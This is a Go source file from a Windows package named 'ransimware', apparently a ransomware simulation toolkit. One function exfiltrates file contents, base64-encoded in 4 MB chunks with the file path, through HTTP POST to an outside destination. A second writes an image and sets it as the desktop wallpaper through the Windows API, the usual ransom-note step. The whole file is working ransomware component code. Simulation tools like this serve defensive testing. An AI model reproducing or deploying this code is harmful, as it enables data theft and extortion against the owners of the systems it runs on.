//+build windows

package ransimware

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"os"
	"unsafe"

	"golang.org/x/sys/windows"

	"gitlab.com/mjwhitta/wininet/http"
)

// HTTPExfil will return a function pointer to an ExfilFunc that
// exfils via HTTP POST requests with the specified headers.
func HTTPExfil(dst string, headers map[string]string) ExfilFunc {
	return func(path string, b []byte) error {
		var b64 string
		var data []byte
		var e error
		var n int
		var stream = bytes.NewReader(b)
		var tmp [4 * 1024 * 1024]byte

		for {
			if n, e = stream.Read(tmp[:]); (n == 0) && (e == io.EOF) {
				return nil
			} else if e != nil {
				return e
			}

			// Create request
			b64 = base64.StdEncoding.EncodeToString(tmp[:n])
			data = []byte(path + " " + b64)

			// Send Message
			if _, e = http.Post(dst, headers, data); e != nil {
				fmt.Println(e.Error())
			}
		}
	}
}

// WallpaperNotify is a NotifyFunc that sets the background wallpaper.
func WallpaperNotify(image string, png []byte) NotifyFunc {
	return func() error {
		var e error
		var f *os.File
		var spiSetdeskwallpaper uintptr = 0x0014
		var spifSendchange uintptr = 0x0002
		var spifUpdateinifile uintptr = 0x0001
		var user32 *windows.LazyDLL

		// Create image file
		if f, e = os.Create(image); e != nil {
			return e
		}

		// Write PNG to file
		f.Write(png)
		f.Close()

		// Change background with Windows API
		user32 = windows.NewLazySystemDLL("User32")
		user32.NewProc("SystemParametersInfoA").Call(
			spiSetdeskwallpaper,
			0,
			uintptr(unsafe.Pointer(&[]byte(image)[0])),
			spifSendchange|spifUpdateinifile,
		)

		// Remove image file
		os.Remove(image)

		return nil
	}
}
